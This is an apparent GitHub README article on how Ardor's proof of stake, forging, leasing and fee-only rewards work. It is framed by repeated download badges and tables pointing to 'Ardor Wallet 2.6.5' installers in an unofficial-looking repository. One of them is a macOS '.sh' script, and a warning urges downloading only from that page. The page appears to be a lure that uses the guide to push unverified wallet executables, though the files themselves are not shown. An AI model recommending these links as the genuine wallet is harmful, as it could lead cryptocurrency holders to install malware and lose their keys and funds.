![Ardor Wallet guide](assets/banner-article.png)

# How Ardor uses proof of stake, and its trade-offs

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

Ardor secures its chain with proof of stake: block production is assigned to accounts in proportion to the ARDR they hold as effective balance, and there is no computational race. The mechanism is efficient and it rewards holding, but it concentrates influence with large holders and pays forgers only what users spend in fees.

## How the selection works

Each eligible account carries weight equal to its effective [balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md), the amount that has been held long enough to count. Every block, the protocol picks among eligible accounts at random, weighted by that balance. A larger balance wins more often, in proportion, and over enough blocks the distribution converges on the weights.

Eligibility has a floor: an account needs at least 1,000 [ARDR](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-ardor-token-does.md) in effective balance and a node that is online and following the chain. Below the floor there is no weight at all, which is why small holders either pool through leasing or do not forge.

## What the stake is, and is not

The stake is not locked. Coins remain spendable, and there is no bond that can be taken away. Leasing is the mechanism that lets an [account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) commit its weight without giving up the funds, and it expires on its own after a fixed term.

| Property | How it works on Ardor |
|---|---|
| Lock-up | None; the balance stays spendable |
| Minimum to forge | 1,000 ARDR effective balance, held 1,440 blocks |
| Delegation | Leasing, up to about 46 days, starts after 1,440 blocks |
| Reward | Transaction fees only |

The absence of a lock is a genuine convenience, and it is also the source of the main economic critique: weight can leave quickly, so the security budget depends on holders choosing to keep balances in place rather than on a penalty for leaving.

## The trade-offs

**Efficiency.** No mining means no energy race. The cost of securing the chain is the cost of running nodes, which is small by comparison with proof-of-work networks of similar age.

**Distribution.** Weight follows balance, so large holders forge more blocks. Over time this concentrates influence unless smaller holders lease together, which is precisely what leasing enables.

**Fee dependence.** With no issuance, the security budget is what users pay. A chain with low activity pays forgers little, and security is funded by demand rather than by a fixed subsidy.

**Predictability.** Selection is probabilistic. A small account can go a long time between blocks, which reads as a fault to people who expect steady income and is not one.

**Governance.** Weight follows balance, and balance follows purchase. A holder who buys a large position acquires influence over block production without any vote being held, which is a different kind of concentration from a foundation holding a treasury. Neither is hidden; they simply fail in different ways.

## Why the parent chain carries the security

Ardor puts block production on one chain and runs the applications as child chains beside it. That concentrates the security budget instead of splitting it: forgers secure one ledger, and every [child chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md) inherits the same set of forgers rather than recruiting its own.

The alternative, one chain per application, asks each project to find its own validators and pay for them. Most cannot, which is how small chains end up with a handful of operators. Sharing one secured parent chain avoids that outcome at the cost of putting every child chain's guarantees in the same place.

## Proof of stake against proof of work

| | Proof of work | Proof of stake on Ardor |
|---|---|---|
| Resource | Computation | Balance held as effective stake |
| Energy | High and continuous | Node operation only |
| Reward source | New coins plus fees | Fees only |
| Hardware obsolescence | Constant pressure | None |
| Entry | Buy equipment and compete | Hold the token and run a node |

Neither model is free of criticism, and the honest summary is that they fail differently. Proof of work spends real resources and centralises around cheap electricity; proof of stake spends little and centralises around capital. Ardor chose the second, and its child chain design spreads the resulting security across several chains.

## What it means for a holder

For someone holding ARDR, proof of stake means three practical things. Holding enough for the threshold makes you eligible to forge, provided a node runs. Leasing gives the same weight to an operator without moving coins. And there is no yield to model, because the reward is fee income rather than issuance.

For someone using a child chain, it means the security underneath is paid for by bundlers in ARDR, not by them. That is why a user can transact in Ignis for months without ever holding the parent chain token.

One consequence for planning: weight is measured in tokens rather than in hardware, so a holder's share of block production changes when the token's price changes relative to the cost of running a node. Nothing in the protocol adjusts for that, and it is one reason the set of active forgers shifts over time. The set is also permissionless - nobody approves a forger and nobody can remove one except by out-forging it, which is why the network has no onboarding queue and no committee deciding who may participate.

## FAQ

### Is proof of stake less secure than proof of work?

It is differently secure. Proof of work makes an attack expensive in energy; proof of stake makes it expensive in capital at risk. Both have failure modes, and neither is unconditionally better.

### Can I lose my stake by forging badly?

Ardor has no lock-up to lose: the balance stays spendable. The risk in forging is a node that is offline, which costs expected income rather than coins.

### Why does Ardor need a minimum balance to forge?

The floor keeps the set of eligible accounts meaningful. Below it, an account has no weight, which is why leasing exists for smaller holders.

### Does Ardor pay staking rewards?

No. Forgers collect transaction fees, and there is no issuance reward. The word staking describes a different mechanism with different economics.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [What forging means on Ardor, and why it is not mining](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/what-ardor-forging-means.md)
- [What forgers actually earn, and what they do not](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/what-ardor-forgers-actually-earn.md)
- [Start forging ARDR in the wallet, and why it may not start](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/start-forging-in-the-ardor-wallet.md)
- [Lease ARDR and earn fees without running a node](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/lease-ardr-without-a-node-in-ardor-wallet.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
